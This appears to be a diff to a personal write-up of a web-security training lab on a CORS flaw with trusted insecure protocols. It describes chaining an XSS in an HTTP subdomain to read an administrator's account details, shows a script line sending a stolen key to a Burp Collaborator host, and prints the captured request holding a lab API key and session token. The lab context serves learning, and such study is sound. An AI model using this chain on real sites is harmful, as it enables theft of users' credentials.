@@ -65,6 +65,13 @@ location='https://vqplle5qte9nzasa3mi75wk1rsxkl9.burpcollaborator.net/log?key='+
 # Lab: CORS vulnerability with trusted insecure protocols
 
 We first need to find the MITM target to insert our script to. Note that the check stock request is for HTTP and is vulnerable to XSS (productId can be html and it will be embedded in the page).
+We then want to get to the accountDetails of the admin and send his API key to our server (burp collaborator).
+In order to do that we need to construct:
+1. An HTML page that submites a request for the account details
+2. When this request is sent, we want to log the response (with the API) to our collaborator so we need to add an onload callback function to send the response to our server
+3. An HTML page that will exploit the product-id vulnerability and inject our malicious HTML page into the weak HTTP new page that we get
+
+
 We then construct the script that the victim's browser will execute (from a valid origin and CORS) like so:
 
 ```html
@@ -90,4 +97,21 @@ Now we can construct the html for the victim that will trigger our request for t
     </script>
   </body>
 </html>
+```
+
+Then we send this to the users and get in our collaborator:
+```http
+GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22QDMUbLzOHOPwQpsAOsyt8YdLkDdzKwhY%22,%20%20%22sessions%22:%20[%20%20%20%20%229PYFFJr32Ji9qO36U9A7cxQvfRAWzqPC%22%20%20]} HTTP/1.1
+Host: jm9qtus85o2ux53s9rw8s435yw4nsc.burpcollaborator.net
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://stock.aca71f8c1f956c34c0da6ff4009d001f.web-security-academy.net/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US
+```
+Which can be decoded as URL to get:
+```
+{  "username": "administrator",  "email": "",  "apikey": "QDMUbLzOHOPwQpsAOsyt8YdLkDdzKwhY",  "sessions": [    "9PYFFJr32Ji9qO36U9A7cxQvfRAWzqPC"  ]}
 ```
